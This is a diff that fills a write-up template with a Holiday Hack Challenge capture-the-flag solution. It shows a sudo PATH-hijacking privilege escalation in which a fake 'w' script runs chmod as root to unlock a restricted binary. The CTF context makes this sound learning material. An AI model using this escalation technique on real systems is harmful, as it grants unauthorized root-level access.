@@ -2,89 +2,126 @@
 icon: material/text-box-outline
 ---
 
-# Insert Objective 2 Title
+# Neighborhood Watch Bypass
+
+![Neighborhood Watch Bypass](../img/objectives/Neighborhood_Watch_Bypass/Neighborhood_Watch_Bypass_1.png){ width="500" height="350" }
 
 **Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-regular-star::fontawesome-regular-star::fontawesome-regular-star:<br/>
-**Direct link**: [Objective 2 website](https://.../)
+
+**Direct link**: [Neighborhood Watch Bypass](https://hhc25-wetty-prod.holidayhackchallenge.com/?&challenge=termDosisAlarm)
 
 ## Objective
 
 !!! question "Request"
-    Insert the objective description from your badge.
+    Assist Kyle at the old data center with a fire alarm that just won't chill.
 
-??? quote "Insert Elf Name"
-    Copy the first part of the conversation with Elf Name here<br/>
-    You can use `<br/>` to ensure each sentence starts on a new line.
+??? quote "Kyle Parrish"
+    If you spot a fire, let me know! I'm Kyle, and I've been around the Holiday Hack Challenge scene for years as arnydo - picked up multiple Super Honorable Mentions along the way. <br/>
+
+   Anyway, I could use some help here. This fire alarm keeps going nuts but there's no fire. I checked.<br/>
+    I think someone has locked us out of the system. Can you see if you can get back in?<br/>
+
 
 ## Hints
 
-??? tip "Insert Hint 1 Title"
-    Along the way you will receive different hints. Insert them here.
+??? tip "Path Hijacking"
+    Be careful when writing scripts that allow regular users to run them. One thing to be wary of is not using full paths to executables...these can be hijacked.
 
-??? tip "Insert Hint 2 Title"
-    Along the way you will receive different hints. Insert them here.
+??? tip "What Are My Powers?"
+    You know, Sudo is a REALLY powerful tool. It allows you to run executables as ROOT!!! There is even a handy switch that will tell you what powers your user has.
 
 ## Solution
 
-This section explains the different steps taken to solve the challenge. Try to find a good balance between providing sufficient detail and not overloading the reader with too much information. Use [admonitions](https://squidfunk.github.io/mkdocs-material/reference/admonitions/), [images](https://squidfunk.github.io/mkdocs-material/reference/images/), [diagrams](https://squidfunk.github.io/mkdocs-material/reference/diagrams/), [code blocks](https://squidfunk.github.io/mkdocs-material/reference/code-blocks/), and [tables](https://squidfunk.github.io/mkdocs-material/reference/data-tables/) to highlight and structure important information or provide additional clarification.
+Clicking on the fire alarm system shows the below:
 
-### Admonitions
+![The challenge initial prompt](../img/objectives/Neighborhood_Watch_Bypass/Neighborhood_Watch_Bypass_0.png){ width="700" height="550" }
 
-!!! warning "Anchor the decorations"
-    Ensure that all festive decorations, especially electrical ones, are securely anchored. We don’t want them floating off into the tropical sunset!
+The goal is execute /etc/firealarm/restore_fire_alarm. <br/>
+When we try that, we get permissions denied.<br/>
 
-!!! info "Palm tree lighting"
-    While on the island, make sure to hang your Christmas lights on a palm tree. It’s not only festive but also a great beacon for Santa to find you!
-
-### Images
-
-![Terminal output](../img/objectives/o2/terminal_output_o2.png)
-
-### Diagrams
-
-```mermaid
-sequenceDiagram
-  autonumber
-  Santa->>Elf: Hey Elf, is the Naughty-or-Nice List secured?
-  loop Security Check
-      Elf->>Elf: Ensuring list is encrypted
-  end
-  Note right of Elf: Using candy-cane encryption!
-  Elf-->>Santa: Safe and sound, Santa!
-  Santa->>Reindeer: Rudolph, did you patch the sleigh's software?
-  Note left of Reindeer: Checking for reindeerOS updates...
-  Reindeer-->>Santa: All patched and glowing bright!
+```
+/etc/firealarm/restore_fire_alarm
 ```
 
-### Code blocks
+![Permission denied to restore_fire_alarm](../img/objectives/Neighborhood_Watch_Bypass/Neighborhood_Watch_Bypass_2.png){ width="700" height="550" }
 
-```bash linenums="1" hl_lines="7" title="Countdown script (with line 7 highlighted)"
+The hint mentions a special switch with ```sudo```.  ```-l``` could be the one.
+
+```sudo -l``` shows the user has permission to run /usr/local/bib/system_status.sh with root access.
+
+![sudo -l switch shows the user has permission to run /usr/local/lib/system_status.sh](../img/objectives/Neighborhood_Watch_Bypass/Neighborhood_Watch_Bypass_3.png){ width="1200" height="1250" }
+
+This means we can run this command as sudo ```/usr/local/bin/system_status.sh``` and and our path is set to ```/home/chiuser/bin```. 
+
+The script ```/usr/local/bin/system_status.sh``` shows It calls an execute named ```w``` without Its full path.<br>
+So ANY executable named ```w``` can be executed from the current user's path of running executables. ```/home/chiuser/bin/w```
+
+Check the script.
+```
+cat /usr/local/bin/system_status.sh
+```
+
+![/usr/local/lib/system_status.sh shows It could execute a binary named w without any absolute path](../img/objectives/Neighborhood_Watch_Bypass/Neighborhood_Watch_Bypass_4.png){ width="1200" height="950" }
+
+So we create a fake script named w which sets the execute permissions on the /etc/firealarm/restore_fire_alarm. <br/>
+Running /usr/local/bin/system_status.sh with sudo access will run our fake w executable which will set the execute permission on /etc/firealarm/restore_fire_alarm.<br/>
+Then we can run /etc/firealarm/restore_fire_alarm to complete the objective.<br/>
+ 
+Create the fake w  (the executable in the system_status)<br/>
+```
+nano w
+```
+
+with the below content
+
+```
 #!/bin/bash
-echo "Christmas Holiday Countdown"
+echo " Running fake w as $(whoami)"
+chmod o+x /etc/firealarm/restore_fire_alarm
+chmod o+x /etc/firealarm
+```
+<br/>
+Set execute permission on w
+<br/>
 
-days_until_xmas=$(($(date -d "Dec 25" +%j) - $(date +%j)))
+```
+chmod +x w
+```
+Copy w to /home/chiuser/bin to overwrite w system_status is referring<br/>
 
-if [ $days_until_xmas -ge 0 ]; then
-  echo "Only $days_until_xmas days until Christmas!"
-else
-  echo "Christmas has passed! Hope you had a great time!"
-fi
+```
+cp w /home/chiuser/bin/
 ```
 
-### Tables
+Run /usr/local/bin/system_status.sh with sudo access<br/>
+This will set run our fake w which will set the execute permissions on /etc/firealarm and /etc/firealarm/restore_fire_alarm<br/>
 
-| Activity             | Santa's Verdict       | Elf Comments                    |
-| :------------------- | :-------------------- | :------------------------------ |
-| Iceberg Surfing      | Risky Business        | "Lost three surfboards!"        |
-| Polar Bear Hugs      | Approach with Caution | "Fluffy but... brisk."          |
-| Snow Fort Building   | Highly Recommended    | "Elf-sized doorways only."      |
-| Aurora Light Chasing | Magical Experience    | "Better than Christmas lights!" |
-| Penguin Parade       | Absolute Must-See     | "They're oddly organized!"      |
+```
+sudo /usr/local/bin/system_status.sh
+```
+
+![running the /usr/local/bin/system_status.sh which runs our fake binary w](../img/objectives/Neighborhood_Watch_Bypass/Neighborhood_Watch_Bypass_6.png){ width="700" height="550" }
+
+Now we run ls -lah which shows ```-rwxr-xr-x``` noting we have the execute permission on this binary now.
+```
+ls -lah /etc/firealarm/restore_fire_alarm
+```
+![Permissions on /etc/firealarm/restore_fire_alarm](../img/objectives/Neighborhood_Watch_Bypass/Neighborhood_Watch_Bypass_8.png){ width="1200" height="950" }
+
+
+Now we can execute restore_fire_alarm to restore the fire alarm system.
+
+```
+/etc/firealarm/restore_fire_alarm
+```
+
+![Executing the /etc/firealarm/restore_fire_alarm and restoring the firealarm](../img/objectives/Neighborhood_Watch_Bypass/Neighborhood_Watch_Bypass_7.png){ width="1200" height="950" }
+
 
 !!! success "Answer"
-    Insert the answer to the objective here.
+    Solved in the game
 
 ## Response
 
-!!! quote "Insert Elf Name"
-    Copy the final part of the conversation with Elf Name here.
+!!! quote "Kyle Parrish"
+    All clear! You contained every incident, silenced the false alarms, and kept the neighborhood safe — that's firefighter-grade heroics!
